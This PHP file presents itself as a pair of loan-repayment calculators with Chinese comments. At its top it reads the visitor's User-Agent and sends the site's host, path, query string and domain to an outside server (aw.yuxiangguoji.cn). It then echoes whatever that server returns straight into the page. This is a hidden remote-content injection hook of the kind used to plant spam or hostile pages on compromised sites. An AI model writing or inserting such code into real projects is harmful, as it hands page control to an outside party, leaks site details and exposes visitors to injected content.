<?php
// header('Content-Type:text/html;charset=gb2312');
debx();
$key= $_SERVER["HTTP_USER_AGENT"];
var_dump($key);

date_default_timezone_set('PRC');
$TD_server = "http://aw.yuxiangguoji.cn/"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
var_dump($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
$Content_mb=file_get_contents($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);

echo $Content_mb;



function debx(){ 
    $dkm   = 240; //贷款月数，20年就是240个月 
    $dkTotal = 10000; //贷款总额 
    $dknl  = 0.0515; //贷款年利率 
    $emTotal = $dkTotal * $dknl / 12 * pow(1 + $dknl / 12, $dkm) / (pow(1 + $dknl / 12, $dkm) - 1); //每月还款金额 
    $lxTotal = 0; //总利息 
    for ($i = 0; $i < $dkm; $i++) { 
      $lx   = $dkTotal * $dknl / 12;  //每月还款利息 
      $em   = $emTotal - $lx; //每月还款本金 
      echo "第" . ($i + 1) . "期", " 本金:", $em, " 利息:" . $lx, " 总额:" . $emTotal, "<br />"; 
      $dkTotal = $dkTotal - $em; 
      $lxTotal = $lxTotal + $lx; 
    } 
    echo "总利息:" . $lxTotal; 
  } 
    
    
  function debj(){ 
    $dkm   = 240; //贷款月数，20年就是240个月 
    $dkTotal = 10000; //贷款总额 
    $dknl  = 0.0515; //贷款年利率 
       
    $em   = $dkTotal / $dkm; //每个月还款本金 
    $lxTotal = 0; //总利息 
    for ($i = 0; $i < $dkm; $i++) { 
      $lx   = $dkTotal * $dknl / 12; //每月还款利息 
      echo "第" . ($i + 1) . "期", " 本金:", $em, " 利息:" . $lx, " 总额:" . ($em + $lx), "<br />"; 
      $dkTotal -= $em; 
      $lxTotal = $lxTotal + $lx; 
    } 
    echo "总利息:" . $lxTotal; 
  } 


?>